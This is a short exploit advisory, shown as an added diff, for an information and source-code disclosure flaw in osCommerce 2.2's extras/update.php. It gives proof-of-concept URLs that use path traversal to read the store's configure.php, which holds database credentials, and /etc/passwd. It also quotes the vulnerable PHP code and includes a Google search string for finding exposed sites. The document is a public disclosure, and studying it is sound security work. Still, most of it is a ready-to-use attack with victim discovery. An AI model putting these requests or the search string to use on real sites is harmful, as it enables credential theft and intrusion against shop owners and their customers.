@@ -1,0 +1,50 @@
+---- osCommerce <= 2.2 "extras/" information/source code disclosure ------------
+
+software site: http://www.oscommerce.com/
+
+
+if extras/ folder is placed inside the www path, you can see all files on target
+system, including php source code with database details, poc:
+
+http://[target]/[path]/extras/update.php?read_me=0&readme_file=../catalog/includes/configure.php
+http://[target]/[path]/extras/update.php?read_me=0&readme_file=/etc/passwd
+
+this is the vulnerable code in update.php:
+
+...
+	include '../mysql.php';
+	// if a readme.txt file exists, display it to the user
+	if(!$read_me) {
+		if(file_exists('readme.txt')) {
+			$readme_file = 'readme.txt';
+		}
+		elseif(file_exists('README')) {
+			$readme_file = 'README';
+		}
+		elseif(file_exists('readme')) {
+			$readme_file = 'readme';
+		}
+		if($readme_file) {
+			$readme = file($readme_file);
+			print "<CENTER><TABLE BORDER=\"1\" WIDTH=\"75%\" CELLPADDING=\"2\" CELLSPACING=\"0\"><TR BGCOLOR=\"#e7e7cc\"><TD>\n";
+			print nl2br(htmlentities(implode($readme, ' ')));
+			print "<HR NOSHADE SIZE=\"1\"><CENTER><A HREF=\"update.php?read_me=1\"><B>Continue</B></A></CENTER>\n";
+			print "</TD></TR></TABLE>\n";
+			exit;
+		}
+	}
+...
+
+google search:
+
+inurl:"extras/update.php" intext:mysql.php -display
+
+--------------------------------------------------------------------------------
+rgod
+
+site: http://retrogod.altervista.org
+mail: rgod at autistici.org
+original advisory: http://retrogod.altervista.org/oscommerce_22_adv.html
+--------------------------------------------------------------------------------
+
+# milw0rm.com [2006-04-14]
